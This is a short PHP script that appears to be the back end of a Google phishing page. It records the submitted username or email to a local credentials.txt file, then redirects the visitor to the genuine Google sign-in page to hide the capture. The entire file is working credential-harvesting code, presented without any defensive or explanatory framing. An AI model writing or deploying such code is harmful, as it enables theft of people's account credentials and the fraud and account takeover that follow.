<?php
$user = $_POST['username'];

file_put_contents("credentials.txt", "Google Username/Email: $user\n", FILE_APPEND);

header('Location: https://accounts.google.com/signin');
exit();
?>
